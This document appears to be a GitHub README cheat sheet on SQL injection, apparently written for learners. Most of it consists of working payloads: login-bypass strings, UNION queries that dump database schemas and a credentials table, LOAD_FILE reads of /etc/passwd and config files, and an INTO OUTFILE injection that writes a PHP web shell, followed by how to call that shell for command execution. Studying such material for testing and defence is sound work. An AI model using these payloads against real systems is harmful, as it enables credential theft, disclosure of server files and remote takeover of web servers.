# SQL Injection
![sql-injection](https://user-images.githubusercontent.com/79256105/172219613-c1e688dc-d2fc-4a1c-9e56-35cb868ae5f2.png)

# What is SQL Injection?
SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands.
# Types of SQL Injection
![sql](https://user-images.githubusercontent.com/79256105/175160165-af1189b5-f22c-41fa-8d8e-7e4e1d14da57.png)

## Authentication Bypass(Subverting Query Logic)
Subverting Query Login used to bypass authenticatio of login page . In this technique, hacker used true statement ' or 1=1 / ' or '1'='1'-- - to bypass application query or user credentials matching.
Some True Statement Payload :
                   
                   ' or '1' = '1
                   ' or '1' = '1’
                   ' or '1' = '1 -- -
                   ' or '1' = '1 #                         
##### 👁️‍🗨️ For More Payload check payload all things github repo https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

## Union Base SQL Injection
## Method for dumping data from database using Uninon SQL Injection

##### Schema,Schemata check

      mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

#### Step 1: Schema/Database check

     ' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -

#### Step 2: Tables check

      ' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -

Here , dev is database name which will replace to your target database name

#### Step3: Columns check

      ' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -

Here , credentials is table name whick will replace to your target table name

#### Step4: Dum Data from table:

      ' UNION select 1, username, password, 4 from dev.credentials-- -

Where username and password are column name , dev is database name , credentials is table name

## Read Data/Sensitive files using Union SQL Injection
     SELECT USER()
     SELECT CURRENT_USER()
     SELECT user from mysql.user

#### Step 1:Privilege Check

      SELECT super_priv FROM mysql.user
      ' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
      ' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
      ' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
#### Step 2:Load File
Now that we know we have enough privileges to read local system files, let us do that using the LOAD_FILE() function. The LOAD_FILE() function can be used in MariaDB / MySQL to read data from files. The function takes in just one argument, which is the file name. The following query is an example of how to read the /etc/passwd file:

      SELECT LOAD_FILE('/etc/passwd');
      ' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -

#### Another Example

We know that the current page is search.php. The default Apache webroot is /var/www/html. Let us try reading the source code of the file at /var/www/html/search.php.

      ' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
      ' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
### Write Files Using Union SQL Injection or RCE Using SQL Injection
Example

      ' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
Web Shell Upload:

      ' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
      
Basic PHP Web Shell:

      <?php system($_REQUEST[cmd]); ?>
      
OR 
      
      <?php system($_GET['cmd']); ?>
 
### For RCE , Call Uploaded Web shell 

Example :
          
          url/upload_file.php?parameter=commnad

          http://cyberteach360/shell.php?cmd=id
          

## Practicing and Learning Resources:

#### Try Hack Me :

      https://tryhackme.com/room/sqlinjectionlm
      https://tryhackme.com/room/sqhell

#### Hack The Box Academy :

      https://academy.hackthebox.com/module/33/section/177

#### Port Swigger:         
